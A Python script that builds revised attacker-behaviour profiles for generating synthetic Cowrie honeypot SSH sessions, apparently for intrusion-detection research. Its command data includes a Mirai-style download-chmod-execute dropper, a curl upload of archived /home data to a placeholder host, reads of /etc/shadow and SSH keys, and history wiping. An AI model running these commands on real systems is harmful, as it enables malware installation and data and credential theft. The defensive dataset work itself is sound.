"""Build dataset_builder/profiles_v2_revised.json from profiles_v2_compat.json (which stays unchanged).

Kept from compat: profile names, attack_cat, label, held_out, credentials (incl. failed_attempts), placeholders.
Redesigned: steps and noise pools, built from shared command families so that categories overlap realistically
while keeping their distinct behaviour. Removed: delay_range (category-specific timing; generator 2.1 ignores it).
Rationale per profile: docs/profile_redesign_v2.md.
"""
import copy
import json
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
SRC = REPO / "dataset_builder" / "profiles_v2_compat.json"
DST = REPO / "dataset_builder" / "profiles_v2_revised.json"

STEPS = {
    "benign_admin": {
        "description": "Ordinary administrator inspection and maintenance: load, disk, services, logs, a package-mirror reachability check.",
        "steps": [
            ["uptime", "w", "who"],
            ["df -h", "du -sh /var/log", "free -m"],
            {"p": 0.7, "cmd": ["ps aux", "ps aux | grep sshd"]},
            {"p": 0.6, "cmd": ["systemctl status ssh", "service cron status", "service ssh status"]},
            {"p": 0.5, "cmd": ["tail -n 50 /var/log/syslog", "journalctl -n 20", "ls -la /var/log | tail -n 5"]},
            {"p": 0.4, "cmd": ["cat /etc/os-release", "uname -r", "hostname"]},
            {"p": 0.3, "cmd": ["curl -I http://{domain}/", "cat /etc/apt/sources.list"]},
        ],
        "noise_pool": ["pwd", "clear", "ls", "date", "id"],
        "noise_count": [0, 2],
    },
    "reconnaissance": {
        "description": "Host fingerprinting after login: identity, kernel, users, network, processes, external-address check.",
        "steps": [
            ["whoami", "id", "w", "groups"],
            ["uname -a", "uname -r", "cat /proc/version"],
            {"p": 0.8, "cmd": ["cat /etc/passwd", "cat /etc/group", "cat /etc/passwd | grep sh"]},
            {"p": 0.7, "cmd": ["ifconfig", "ip a", "ip route", "cat /etc/resolv.conf"]},
            {"p": 0.6, "cmd": ["ps aux", "ss -tulpn", "netstat -antp"]},
            {"p": 0.5, "cmd": ["hostname", "cat /etc/issue", "cat /etc/os-release"]},
            {"p": 0.4, "cmd": ["lscpu", "nproc", "free -m", "df -h"]},
            {"p": 0.3, "cmd": ["curl -s http://{domain}/ip", "wget -qO- http://{domain}/ip"]},
        ],
        "noise_pool": ["pwd", "ls -la", "ls"],
        "noise_count": [0, 2],
    },
    "brute_force": None,  # unchanged: authentication-oriented; an optional short check after the accepted guess
    "botnet": {
        "description": "Mirai-style dropper: architecture check, writable directory, download attempt, make executable, run, clean up.",
        "steps": [
            ["uname -a", "uname -m", "cat /proc/cpuinfo"],
            ["cd {dir}", "cd /tmp || cd /var/tmp"],
            ["wget http://{domain}/{bin}", "curl -O http://{domain}/{bin}", "wget -q http://{domain}/{bin} -O {bin}"],
            ["chmod +x {bin}", "chmod 777 {bin}"],
            ["./{bin}", "sh {bin}"],
            {"p": 0.7, "cmd": ["rm -rf {bin}", "rm {bin}"]},
            {"p": 0.3, "cmd": ["history -c", "unset HISTFILE"]},
        ],
        "noise_pool": ["enable", "system", "shell", "id", "w"],
        "noise_count": [0, 2],
    },
    "privilege_escalation": {
        "description": "Privilege inspection: identity and groups, sudo rights, SUID binaries, credential files, cron, kernel version.",
        "steps": [
            ["id", "whoami", "groups"],
            ["sudo -l", "cat /etc/sudoers"],
            {"p": 0.8, "cmd": ["find / -perm -4000 -type f 2>/dev/null", "find / -perm -u=s -type f 2>/dev/null",
                               "ls -la /usr/bin | grep rws"]},
            {"p": 0.7, "cmd": ["cat /etc/shadow", "ls -la /etc/shadow", "ls -la /etc/passwd"]},
            {"p": 0.6, "cmd": ["find / -name id_rsa 2>/dev/null", "ls -la /root/.ssh", "ls -la ~/.ssh"]},
            {"p": 0.5, "cmd": ["cat /etc/crontab", "crontab -l", "ls -la /etc/cron.d"]},
            {"p": 0.4, "cmd": ["uname -r", "cat /proc/version"]},
        ],
        "noise_pool": ["ls -la", "pwd", "w"],
        "noise_count": [0, 2],
    },
    "lateral_movement": {
        "description": "Lateral reconnaissance only (isolated Cowrie cannot represent a connection to another host): "
                       "neighbour discovery, known hosts, history, SSH configuration, reachability probes.",
        "steps": [
            ["ip route", "arp -a", "cat /etc/hosts", "cat /etc/hosts | grep -v '^#'"],
            {"p": 0.8, "cmd": ["cat ~/.ssh/known_hosts", "cat ~/.bash_history", "cat ~/.bash_history | grep ssh"]},
            {"p": 0.7, "cmd": ["ping -c 2 {lan_ip}", "nc -zv {lan_ip} 22"]},
            {"p": 0.6, "cmd": ["cat ~/.ssh/config", "ls -la ~/.ssh"]},
            {"p": 0.5, "cmd": ["netstat -antp", "ss -tan", "w"]},
            {"p": 0.4, "cmd": ["nmap -sn 192.0.2.0/24"]},
        ],
        "noise_pool": ["whoami", "hostname", "id"],
        "noise_count": [0, 1],
    },
    "data_exfiltration": {
        "description": "Attempted exfiltration: locate data, stage an archive, attempt an HTTP upload, clean up. "
                       "Cowrie records the attempt; no transfer succeeds in the isolated lab.",
        "steps": [
            ["find / -name '*.sql' 2>/dev/null", "find /home -name '*.db' 2>/dev/null", "ls -la /home"],
            {"p": 0.7, "cmd": ["du -sh /home /var/www", "ls -la /var/backups", "df -h"]},
            ["tar czf {dir}/d.tgz /home", "tar cf {dir}/d.tar /var/www"],
            {"p": 0.8, "cmd": ["curl -T {dir}/d.tgz http://{ip}/u", "curl -T {dir}/d.tgz http://{domain}/u"]},
            {"p": 0.5, "cmd": ["rm -f {dir}/d.tgz {dir}/d.tar"]},
        ],
        "noise_pool": ["id", "ls", "whoami"],
        "noise_count": [0, 2],
    },
}

if DST.exists():
    raise SystemExit(f"{DST} exists; refusing to overwrite")
src = json.loads(SRC.read_text(encoding="utf-8"))
out = copy.deepcopy(src)
out["version"] = "2.3.0-revised"
out["derived_from"] = {"file": "dataset_builder/profiles_v2_compat.json", "version": src["version"]}
out["description"] = ("Revised V2 profiles (2026-11-10, task 12): shared command families across categories to reduce "
                      "template fingerprints found by reports/v2_feature_leakage_validation/report.md, keeping each "
                      "category's distinct behaviour. Cowrie-compatible (no ssh/scp, wget only to .example names). "
                      "No per-profile timing: generator 2.1 uses one category-independent PacingPolicy. "
                      "Design: docs/profile_redesign_v2.md.")
for profile in out["profiles"]:
    profile.pop("delay_range", None)
    profile.pop("compat_notes", None)
    new = STEPS[profile["name"]]
    if new is None:
        profile["redesign_notes"] = ["unchanged: brute force stays authentication-oriented (3-5 rejected guesses, then "
                                     "an optional short check); commands are not added to balance features"]
        continue
    profile.update({k: v for k, v in new.items()})
    profile["redesign_notes"] = ["steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"]
assert [p["name"] for p in out["profiles"]] == [p["name"] for p in src["profiles"]]
DST.write_text(json.dumps(out, indent=2) + "\n", encoding="utf-8")
print("wrote", DST.relative_to(REPO), out["version"])
